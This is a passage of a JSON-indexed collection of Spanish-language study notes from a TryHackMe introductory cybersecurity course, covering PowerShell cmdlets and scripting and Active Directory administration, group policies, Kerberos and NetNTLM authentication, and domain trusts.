Description \n-------    ----                                ----------           ----------- \n0.4.7      powershell-yaml                     PSGallery            Powershell module for serializing and deserializing YAML\n\n2.2.5      PowerShellGet                       PSGallery            PowerShell module with commands for discovering, installing, updating and publishing the PowerShell artifacts like Modules, DSC Resources, Role Capabilities and Scripts.                                                   \n1.0.80.0   PowerShell.Module.InvokeWinGet      PSGallery            Module to Invoke WinGet and parse the output in PSOjects\n\n0.17.0     PowerShellForGitHub                 PSGallery\n```\n\nUna vez identificado, el módulo puede ser instalado con `Install-Module`."
  },
  {
    "title": "0. Windows PowerShell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/0-windows-powershell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/0. Windows PowerShell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/1. Introduction]]\n[[2. What is PowerShell]]\n[[3. PowerShell Basics]]\n[[4. Navigating the File System and Working with Files]]\n[[5. Piping, Filtering, and Sorting Data]]\n[[6. System and Network Information]]\n[[7. Real-Time System Analysis]]\n[[8. Scripting]]\n"
  },
  {
    "title": "7. Real-Time System Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/7-real-time-system-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/7. Real-Time System Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "Para recopilar más información avanzada del sistema, especialmente referente a los aspectos dinámicos como procesos en ejecución, servicios y conexiones de red activas, podemos usar un set de cmdlets.\n\n`Get-Pocess` nos retorna una vista de los procesos en ejecución actuales, incluyendo la CPU y el uso de memoria.\n\nDe manera similar, `Get-Service` nos permite ver los servicios en la máquina y sus estados.\n\nPara monitorizar conexiones de red activas, usamos `Get-NetTCPConnection`, que muestra las conexiones TCP actuales dando una vista de conexiones remotas y locales.\n\nPara generar hashes de archivos podemos usar `Get-FileHash`: `Get-FileHash -Path \"ruta\"`.\n\n>Ejercicio: El pirata del ejercicio anteroro (p1r4t3) ha modificado un servicio para que la propiedad DisplayName muestre su motto, encuentra el servicio.\n\n>Respuesta:\n```Powershell\nPS C:\\Users\\captain> Get-Service | Where-Object { $_.DisplayName -like \"*A merry life and a short one.*\" }\n\nStatus   Name               DisplayName                           \n------   ----               -----------                           \nRunning  p1r4t3-s-compass   A merry life and a short one.\n```\n"
  },
  {
    "title": "6. System and Network Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/6-system-and-network-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/6. System and Network Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell fue creada específicamente para combatir la necesidad creciente de una herramienta potente de automatización. Como tal, provee una cantidad de cmdlets que nos permite obtener información detallada de la configuración del sistema y ajustes de red.\n\nPor ejemplo, `Get-ComputerInfo` nos devuelve una lista de información del sistema que incluye información del sistema operativo, especificaciones de hardware, detalles de la BIOS y más. En contrapartida a u homólogo tradicional, `systeminfo` que sólo devuelve algunos detalles.\n\nEsencial para el manejo de cuentas es `Get-LocalUser` que lista todas las cuentas de usuarios locales en el sistema. Devuelve el nombre de la cuenta, el estado y una breve descripción.\n\nEl cmdlet `Get-NetIpConfiguration` nos da información detallada sobre las interfaces de red en el sistema, incluyendo la dirección IP, servidores DNS y configuraciones gateway.\n\nEn caso de que necesitemos detalles específicos de las direcciones IP asignadas a las interfaces de red, el cmdlet `Get-NetIpAddress` nos servirá."
  },
  {
    "title": "8. Scripting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/8-scripting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/8. Scripting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "El scripting es el proceso de escribir y ejecutar una serie de comandos en un archivo de texto, conocido como script, para automatizar tareas que un usuario realizaría en una CLI.\n\nDe manera simple, scriptear es como darle a un ordenador una lista de tareas (to-do list). Cada una de las lineas del script representa un comando.\n\nDependiendo de tu equipo los scripts pueden servir para múltiples cosas:\n\n- Blue team: Puede automatizar tareas como escaneo de logs, detección de anomalías o extracción de indicadores de compromiso.\n- Red team: Puede automatizar tareas como la enumeración, ejecución remota de comandos y la creación de scripts ofuscados para sobrepasar defensas.\n- System administrators: Puede automatizar tareas como el manejo de configuraciones del sistema o securización de redes.\n\nNo podemos acabar esta unidad sin mencionar el cmdlet `Invoke-Command`. Es esencial para ejecutar comandos en sistemas remotos. Puede ser usado para ejecutar payloads o scripts en otros sistemas.\n\n```powershell\nPS C:\\Users\\captain> Get-Help Invoke-Command -examples\n\nNAME\n    Invoke-Command\n    \nSYNOPSIS\n    Runs commands on local and remote computers.\n    \n    ------------- Example 1: Run a script on a server -------------\n    \n    Invoke-Command -FilePath c:\\scripts\\test.ps1 -ComputerName Server01\n    \n    The FilePath parameter specifies a script that is located on the local computer. The script runs on the remote computer and the results are returned to the local computer.\n\n    --------- Example 2: Run a command on a remote server ---------\n\n    Invoke-Command -ComputerName Server01 -Credential Domain01\\User01 -ScriptBlock { Get-Culture }\n\n    The ComputerName parameter specifies the name of the remote computer. The Credential parameter is used to run the command in the security context of Domain01\\User01, a user who has permission to run commands. The ScriptBlock parameter specifies the command to be run on the remote computer.\n\n    In response, PowerShell requests the password and an authentication method for the User01 account. It then runs the command on the Server01 computer and returns the result.\n```\n\nEn el segundo ejemplo vemos que añadiendo `-ScriptBlock { ... }` no necesitamos saber scripting pues podemos ejecutar cualquier comando directamente."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "<h2>Objetivos de aprendizaje</h2>\nEn esta lección vamos a aprender:\n\n- Aprender sobre PowerShell y sus capacidades.\n- Entender la estructura básica del lenguaje de PowerShell.\n- Aprender y ejecutar algunos comandos básicos de PowerShell.\n- Entender las muchas aplicaciones de la PowerShell en la industria de la ciberseguridad.\n\n----------------\n<h2>Pre-requisitos</h2>\nAntes de empezar aquí es importante haber entendido el contenido de:\n\n- [[3. Windows and AD Fundamentals]]\n- [[0. Windows Command Line]]\n"
  },
  {
    "title": "4. Navigating the File System and Working with Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/4-navigating-the-file-system-and-working-with-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/4. Navigating the File System and Working with Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell nos ofrece un rango de cmdlets para navegar por el sistema de ficheros y gestionar archivos.\n\nSimilar a `dir` (o `ls` en UNIX), `Get-ChildItem` lista los archivos y directorios de una localización especificada con el parámetro `-Path`. Si no se especifica la ruta, se tomará por defecto la actual.\n\nPara navegar a un directorio diferente podemos usar `Set-Location`. Es el homólogo de `cd`.\n\nPara crear cualquier cosa podemos usar `New-Item`. Después especificamos la ruta y qué tipo de ítem es. De forma similar, para borrar un ítem: `Remove-Item`.\n\nPara copiar y mover: `Copy-Item` y `Move-Item`.\n\nPara leer los contenidos de un archivo, `Get-Content`."
  },
  {
    "title": "5. Piping, Filtering, and Sorting Data",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/5-piping-filtering-and-sorting-data/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/5. Piping, Filtering, and Sorting Data.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "El pipeado es una técnica usada en la línea de comandos que permite usar el output de un comando como input de otro. Esto crea una secuencia de comandos que fluye de uno a otro. Se representa con el símbolo `|`.\n\nEn PowerShell es más poderoso si cabe, porque pasa objetos, no texto plano. Estos objetos portan no sólo la información, sino también las propiedades y métodos.\n\nPor ejemplo, si quisiéramos listar los directorios que hay en una ruta y ordenarlos por tamaño podríamos hacer: `Get-ChildItem -Path <ruta> | Sort-Object Length`.\n\nHemos visto `Sort-Object` que nos permite organizar en base a una propiedad del objecto. Para filtrar objetos basado en condiciones específicas podemos usar `Where-Object`. Por ejemplo para listar solo los `.txt` de un directorio: `Get-ChildItem | Where-Object -Property \"Extension\" -eq \".txt\"`.\n\nEs bueno conocer ciertos operadores:\n\n- `-ne`: Not equal, diferente.\n- `-gt`: Greater than, mayor que.\n- `-ge`: Greater or equal, mayor o igual.\n- `-lt`: Less than, menor que.\n- `-le`: Less or equal, menor o igual.\n\nTambién podemos seleccionar propiedades que coincidan con un patrón, por ejemplo: `Get-ChildItem | Where-Object -Property \"Name\" -like \"ship*\"`.\n\nPara no mostrar todos podemos usar `Select-Object`: `Get-ChildItem | Select-Object Name,Length`.\n\n>Ejercicio: Trata de crear una línea que nos permita ver el archivo más grande de `C:\\Users\\captain\\Documents\\captain-cabin`.\n\n>Respuesta: `Get-ChildItem -Path \"C:\\Users\\captain\\Documents\\captain-cabin\"| Sort-Object Length`.\n\n>Una respuesta más precisa (la del ejercicio): `Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1`.\n\nEl cmdlet `Select-String` busca patrones de texto, similar a `grep` de UNIX o a `findstr` en Windows Command Prompt. Soporta el uso de [regex](https://learn.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions).\n\n```powershell\nPS C:\\Users\\captain\\Documents\\captain-cabin> Select-String -Path \".\\captain-hat.txt\" -Pattern \"hat\" \n\ncaptain-hat.txt:8:Don't touch my hat!\n```\n"
  },
  {
    "title": "0. Active Directory Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/0-active-directory-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/0. Active Directory Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "[[1. Windows Domains]]\n[[2. Active Directory]]\n[[3. Managing Users in AD]]\n[[4. Managing Computers in AD]]\n[[5. Group Policies]]\n[[6. Authentification Methods]]\n[[7. Trees, Forests and Trusts]]\n"
  },
  {
    "title": "6. Authentification Methods",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/6-authentification-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/6. Authentification Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Al usar dominios de Windows, todas las credenciales se guardan en los DCs. Cuando un usuario se autentifica en un servicio usando credenciales, el servicio le pregunta al DC si la verificación es correcta. Se utilizan dos protocolos para la autentificación en WD:\n\n- Kerberos: Usado por cualquier versión reciente de Windows. Es el protocolo por defecto en cualquier dominio reciente.\n- NetNTLM: Protocolo de autentificación de legado, mantenido sólo por propósitos de compatibilidad.\n\n-------------------\n<h2>Autentificaión Kerberos</h2>\nSigue el siguiente proceso:\n\n1. El usuario manda el nombre de usuario y un instante de tiempo encriptado usando una llave derivada de su contraseña al KDC (Key Distribiution Center), un servicio instalado en el DC.\n   \n   El KDC crea y manda de vuelta  el TGT (Ticket Granting Ticket) que permitirá al usuario pedir otros tickets para acceder a servicios específicos. Puede que esta idea parezca rara, pero permite al usuario pedir otros tickets sin necesidad de estar constantemente enviando credenciales. Junto con el TGT, una llave de sesión (Session Key) es dada al usuario.\n   \n   >[!NOTE] Fíjate que el TGT es encriptado usando el hash krbtgt de la contraseña.\n   \n   ![[064.png]]\n2. Cuando un usuario quiere conectarse a un servicio de la red usará su TGT para pedirle al KDC por un TGS (Ticket Granting Service). Estos son tickets que permiten la conexión sólo al servicio específico para el que fue creado.\n   \n   Para pedir un TGS, el usuario mandará su nombre de usuario y un instante de tiempo encriptado usando la llave de sesión junto con el TGT y el SPN (Service Principal Name).\n   \n   Como resultado, el KDC mandará junto al TGT una Service Session Key. El TGS está encriptado usando una llave derivada del Hash del Propietario del dominio.\n   \n   ![[065.png]]\n3. El TGS puede ser mandado al servicio deseado para autentificarse y establecer una conexión. El servicio usará los hashes de las contraseñas de sus cuentas configuradas para desencriptar el TGS y validar la llave de sesión de servicio.\n   \n   ![[066.png]]\n\n------------------\n<h2>Autentificación NetNTLM</h2>\nEl proceso es el siguiente:\n\n![[067.png]]\n\n1. El cliente manda una petición de verificación al servidor al que quieren acceder.\n2. El servidor genera un número aleatorio y lo manda como reto al cliente.\n3. El cliente combina el hash de su contraseña NTLM con el reto mandado para generar una respuesta y la manda al servidor de vuelta.\n4. El servidor manda el reto y la respuesta al DC para verificación.\n5. El DC usa el reto para recalcular la respuesta y la compara con la mandada. Si coinciden, se autentifica al usuario, y si no se rechaza.\n6. El servidor manda el resultado de la comparativa al cliente."
  },
  {
    "title": "3. Managing Users in AD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/3-managing-users-in-ad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/3. Managing Users in AD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Nuestra primera tarea como administrador del dominio es comprobar los OUs y usuarios existentes en el AD ya que hay algunos cambios recientes. Los cambios son los siguientes:\n\n![[050.png]]\n\n---------------\n<h2>Borrar OUs y usuarios</h2>\nLo primero que deberías notar es que hay un departamento OU adicional en nuestro AD actual:\n\n![[051.png]]\n\nNos han dicho que lo han cerrado por ajustes de presupuesto. Si intentas hacer click derecho y borrarlo recibirás el error:\n\n![[052.png]]\n\nPara poder borrarlo debemos activar opciones avanzadas en el menú `View` porque los OUs están protegidos contra borrados accidentales.\n\nUna vez allí podemos hacer click derecho en el OU que queramos borrar, darle a propiedades y una vez allí ir a Objeto y quitar el tick de `Protect object from accidental deletion`.\n\n![[053.png]]\n\nActo seguido podemos borrar el OU.\n\nDespués de borrarlo nos damos cuenta de que no todos los usuarios coinciden, en concreto sobran Cristine y Robert de Sales, por lo que los eliminamos. El resto está bien.\n\n-------------------\n<h2>Delegación</h2>\nUna de las cosas buenas que puedes hacer en AD es delegar (dar control a ciertos usuarios sobre algunas OUs). Uno de los casos más comunes para este propósito es darle al `IT Support` los privilegios necesarios para resetear la contraseña de otros usuarios de bajos privilegios.\n\nEn este ejemplo vamos a delegar control de Sales a Phillip. Para ello hacemos click derecho en el OU que queramos delegar, después introducimos el nombre y le damos a `check names`. Después le damos a `next` y seleccionamos la opción que queramos aplicar, en este caso: `Reset user passwords and force password change at next logon`.\n\nPara forzar a un usuario a cambiar su contraseña desde la consola podemos usar el comando: `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose.\n\nComo no queremos que siga usando una contraseña que ya conocemos podemos hacer: `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`\n\n\n>[!IMPORTANT] Para conectarnos a una máquina Windows por RDP (Remote Desktop Protocol) usamos el comando: `xfreerdp3 /u:<usuario> /p:<contraseña> /v:<direccion_ip>`.\n\n"
  },
  {
    "title": "1. Windows Domains",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/1-windows-domains/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/1. Windows Domains.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "En una pequeña empresa con, por ejemplo 5 ordenadores, seguramente tú mismo puedas configurarlos, entrar a cada uno y crear las cuentas necesarias y administrarles permisos. Y si algo falla, ir a ese ordenador tu mismo y arreglarlo. \n\nDe cualquier forma esto no es realista frente a un escenario más grande. Para sobreponernos a estas dificultades usamos un Windows Domain. Esto es un grupo de usuarios y ordenadores bajo la administración de un negocio. La idea principal de un WD es centralizar la administración de componentes comunes en un sólo repositorio llamado Active Directory (AD). El servidor que corre el AD es conocido como Domain Controller (DC).\n\n![[047.png]]\n\nVentajas principales:\n\n- Manejo centralizado de identidad.\n- Manejo de políticas de seguridad.\n\nPuede sonar lioso, pero seguro que en algún momento has recibido un usuario y contraseña en el colegio para entrar a los ordenadores.\n\n<h2>Actividad</h2>\nPara la siguiente actividad eres el nuevo admin de IT de THM."
  },
  {
    "title": "2. Active Directory",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/2-active-directory/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/2. Active Directory.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "El núcleo de cualquier WD es el Active Directory Domain Service (AD DS). Actúa como un catálogo que contiene información de todos los \"objetos\" que existen en tu red. Entre los objetos soportados por AD tenemos: usuarios, grupos, máquinas, impresoras, comparticiones y más.\n\n<h2>Users</h2>\nLos usuarios son uno de los objetos más comunes en el AD. Son uno de los objetos conocidos como **security principals**. Esto significa que pueden ser autenticados por el dominio y ser asignados con privilegios o recursos.\n\nLos usuarios pueden usarse para representar dos tipos de entidad:\n\n- Personas: Por ejemplo empleados, que necesitan acceso a la red.\n- Servicios: Servicios como MSSQL necesitan ciertos permisos para ejecutar el servicio, es por esto que se crean usuarios con esos privilegios.\n\n-------------\n<h2>Machines</h2>\nSon otro tipo de objeto del AD. Por cada ordenador que se una al AD domain, un nuevo objeto máquina será creado. Estas también son consideradas **security principals** y se les asigna una cuenta. Estas cuentas son administradores locales y, aunque se supone que nadie debe conectarse con ellas más que el propio ordenador, si tienes la contraseña puedes entrar.\n\n>[!NOTE] Las contraseñas de las cuentas de máquinas son compuestas por 120 caracteres random y van rotando.\n\nIdentificar las cuentas es fácil pues se componen del nombre de la máquina más el símbolo del dolar. Una máquina llamada `DC01` tendrá una cuenta llamada `DC01$`.\n\n------------\n<h2>Security Groups</h2>\nPuedes darles la capacidad a ciertos grupos de dar permisos a otros usuarios o grupos. Esto permite mejor manejabilidad y menos compromiso de seguridad. También son considerados **security principals**.\n\nLos grupos pueden tener por miembros usuarios y máquinas. Muchos de estos son creados por defecto:\n\n| **Security Group** | **Descripción**                                                                                                                     |\n| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |\n| Domain Admins      | Los usuarios de este grupo tienen privilegios administrativos sobre el dominio entero.                                              |\n| Server Operators   | Los usuarios en este grupo pueden administrar DC. Sin embargo, no pueden cambiar ninguna suscripción de grupos administrativos.     |\n| Backup Operators   | Pueden acceder a cualquier archivo ignorando sus permisos. Son usados por lo general para realizar copias de seguridad del sistema. |\n| Account Operators  | Los usuarios de este grupo pueden crear o modificar otras cuentas del dominio.                                                      |\n| Domain Users       | Incluye todas las cuentas de usuario del dominio.                                                                                   |\n| Domain Computers   | Incluye todos los ordenadores del dominio.                                                                                          |\n| Domain Controllers | Incluye todos los DC del dominio.                                                                                                   |\n\n-----------------\n<h2>Active Directory Users and Computers</h2>\nPara configurar usuarios, grupos o máquinas en AD, tenemos que entrar en el DC y ejecutar `Active Directory Users and Computers` desde el menú.\n\n![[048.png]]\n\nEsto abrirá una ventana donde podemos ver la jerarquía de los usuarios, ordenadores y grupos que existen en el dominio. Estos objetos están organizados en OUs (Unidades de Organización u Organizational Units) que son objetos contenedores que nos permiten clasificar usuarios y máquinas. Los OUs se suelen usar parta definir sets de usuarios con políticas similares. Por ejemplo, los empleados de ventas de una compañía tendrán un set diferente que los empleados de IT.\n\nAlgo muy común es que un OU tenga \"hijos\". Por ejemplo en nuestra máquina el OU `THM` tiene por hijos: IT, Management, Marketing y Sales.\n\n![[049.png]]\n\nAl abrir cualquier OU podemos ver los usuarios que tiene este.\n\nTambién hay otros contenedores que se crean por defecto. Estos son:\n\n- Builtin: Contiene grupos por defecto disponibles para cualquier host de Windows.\n- Computers: Cualquier máquina que se una a la red será puesta aquí por defecto. La puedes mover si lo deseas.\n- Domain Controllers: OU por defecto que contiene los DC en la red.\n- Users: Usuarios y grupos por defecto que se apliquen al contexto completo del dominio.\n- Managed Service Accounts: Contiene cuentas usadas por servicios del Dominio de Windows.\n\n-----------------\n<h2>Security Groups vs OUs</h2>\nSeguramente te preguntarás por qué tenemos grupos y OUs. Mientras que los dos se utilizan para clasificar usuarios su propósito es completamente diferente.\n\n- OUs son útiles para aplicar políticas a usuarios y ordenadores lo que incluye configuraciones específicas para un set de usuarios dependiendo del rol en la empresa. Un usuario puede se sólo miembro de un OU a la vez ya que no tendría sentido aplicar dos sets de políticas al mismo usuario.\n- Grupos de seguridad son usados para conceder permisos sobre los recursos. Usaremos grupos si queremos permitir a algunos usuarios acceder a archivos compartidos o una impresora, por ejemplo. Un usuario puede ser parte de múltiples grupos."
  },
  {
    "title": "5. Group Policies",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/5-group-policies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/5. Group Policies.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "Por el momento hemos organizado usuarios y ordenadores en OUs por el simple hecho de hacerlo, pero la idea detrás es aplicar diferentes políticas para cada OU.\n\nWindows controla esas políticas a través de GPO (Group Policy Objects). Los GPOs son simplemente una colección de ajustes que puede ser aplicada a las OUs. Para configurar GPOs podemos usar la herramienta GPM (Group Policy Management).\n\nLo primero que vemos al abrirlo es la jerarquía de OU, previamente definida. Para configurar las políticas de los grupos, debemos crear primero un GPO debajo de \"Group Policy Objects\" y linkearlo con el OU donde queremos aplicar sus políticas. Hay algunas ya creadas en nuestra máquina:\n\n![[056.png]]\n\nPodemos ver en la imagen de arriba que se han creado 3 GPOs. `Default Domain Policy` y `RDP Policy` están conectados con el dominio `thm.local` y `Default Domain Controllers Policy` está linkeado con `Domain Controllers`.\n\n>[!IMPORTANT] Cualquier GPO será aplicado a la OU linkeada y cualquier sub-OU debajo de esta. Por ejemplo, la OU `Sales` se verá afectada por `Default Domain Policy`.\n\nAnalicemos  `Default Domain Policy` para ver qué contiene una GPO. La primera pestaña que veremos al seleccionar un GPO es **scope**, que es donde el GPO es linkeado en el AD. Podemos ver que sólo ha sido linkeado al dominio `thm.local`.\n\n![[057.png]]\n\nComo podemos ver, también se puede aplicar filtrado de seguridad a los GPOs para que sólo se apliquen a ciertos usuarios u ordenadores bajo una OU. Por defecto se aplicarán a los usuarios autentificados, lo que incluye a todos los usuarios/PCs.\n\nLa pestaña `Settings` incluye los contenidos del GPO y nos deja ver las configuraciones específicas que aplica. Como ya hemos visto, cada GPO tiene configuraciones que aplican a los ordenadores sólo y configuraciones que aplican a los usuarios sólo. En este caso `Default Domain Policy` sólo contiene configuraciones de ordenador.\n\n![[058.png]]\n\nComo este GPO aplica a todo el dominio, cualquier cambio afectará a todos los ordenadores. Cambiemos la longitud mínima de las contraseñas para que tengan 10 caracteres al menos:\n\n![[059.png]]\n\nEsto abrirá una nueva pestaña. Para cambiar la longitud: `Computer Configuratios -> Policies -> Windows Setting -> Security Settings -> Account Policies -> Password Policy` y ahí cambiamos el valor requerido:\n\n![[060.png]]\n\nComo podemos ver, múltiples políticas pueden establecerse en un GPO. Si necesitas información sobre cualquiera de ellas puedes hacer doble click en ellas y leer la pestaña `Explain`.\n\n![[061.png]]\n\n------------------------\n<h2>Distribución de GPOs</h2>\nLos GPOs son distribuidos a la red a través de una compartición de red llamada `SYSVOL`, que está almacenada en el DC. Todos los usuarios en el dominio deberían típicamente tener acceso a esta compartición para sincronizar sus GPOs periódicamente. `SYSVOL` comparte al directorio `C:\\Windows\\SYSVOL\\sysvol\\` por defecto.\n\nSi queremos forzar la sincronización de un dispositivo después de hacer un cambio en los GPOs podemos ejecutar el siguiente comando en el ordenador a actualizar: `PS C:\\> gpupdate /force`.\n\n------------------------\n<h2>Creando algunos GPOs para THM Inc.</h2>\nComo parte de nuestro nuevo trabajo, nos han pedido implementar algunos GPOs pare permitir:\n\n1. Bloquear a los usuarios fuera de IT de acceder al panel de control.\n2. Hacer que las estaciones de trabajo y servidores bloqueen su pantalla después de 5 minutos de inactividad.\n\nVamos a ver cómo podemos hacerlo:\n\n<h3>Restringir acceso al Panel de Control</h3>\nQueremos restringir el acceso al panel de control para aquellos usuarios que no pertenezcan al departamento de IT.\n\nCrearemos un nuevo GPO llamado `Restrict Control Panel Access`. Como queremos que este GPO se aplique a usuarios específicos buscaremos debajo de `User Configuration` la siguiente política:\n\n![[062.png]]\n\nLe damos a `Enable`.\n\nAhora tenemos que linkearlos con las OUs correspondientes (todas menos IT). Para ello, arrastramos el GPO a las OUs.\n\n-----------------------\n<h3>Auto Lock de la Pantalla</h3>\nPodríamos aplicar este GPO a las OUs que creamos antes (Workstations y Servers). Pero esta no es la mejor solución. Ya que queremos que todos los ordenadores sean afectados por esto, podemos aplicarlo al dominio raíz.\n\nHagamos un GPO nuevo que llamaremos `Auto Lock Screen`.\n\n![[063.png]]\n\nDespués de crearlo y configurarlo lo arrastramos a `thm.local`."
  },
  {
    "title": "7. Trees, Forests and Trusts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/7-trees-forests-and-trusts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/7. Trees, Forests and Trusts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
    "content": "De momento hemos visto cómo manejar un solo dominio, el rol de un DC y cómo organiza ordenadores, servidores y usuarios. Cuando las compañías crecen, también lo hacen sus redes.\n\n------------\n<h2>Trees</h2>\nImagina que tu compañía ahora entra en competición en un nuevo país, y que este tiene un set de leyes diferentes por el cual tiene que actualizar tus GPOs. Aunque esto sería posible hacerse con una sola estructura OU, sería más difícil. Es aquí donde entran los trees:\n\n![[068.png]]\n\nEsta estructura particionada nos da más control sobre lo que pueden hacer las ramas en el dominio. A parte de gestionar lo que cada uno puede y no puede hacer, también se pueden aplicar políticas diferentes para cada rama.\n\n-----------------\n<h2>Forests</h2>\nSupón que tu compañía sigue creciendo y al final acaba adquiriendo otra empresa (MHT Inc.). Cuando las dos se fusionen, tendrás dos trees, una para cada compañía. Es por esto que se llama bosque.\n\n![[069.png]]\n\n--------------------\n<h2>Trust Relationships</h2>\nEn resumidas cuentas, tener relaciones de confianza permite que un usuario de `THM UK` acceda a un recurso de `MHT EU` por ejemplo. La relación más simple es una `One-Way Relationship`. Esto significa que si el dominio `AAA` confía en el dominio `BBB`, un usuario del dominio `BBB` podrá acceder a recursos en el dominio `AAA`.\n\n![[070.png]]\nOtra relación es la `Two-Way Relationship`. Una vez sabemos cual es la one-way, esta se vuelve bastante intuitiva. Usuarios de ambos dominios podrán acceder a recursos en el otro.\n\n>[!IMPORTANT] Tener una relación de confianza no significa que los usuarios puedan acceder a TODOS los recursos, tú puedes configurar y modificar qué usuarios y a qué recursos.\n\n"
  },
  {
    "title": "4. Managing Computers in AD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/4-active-directory-basics/4-managing-computers-in-ad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/4. Active Directory Basics/4. Managing Computers in AD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 4. Active Directory Basics",
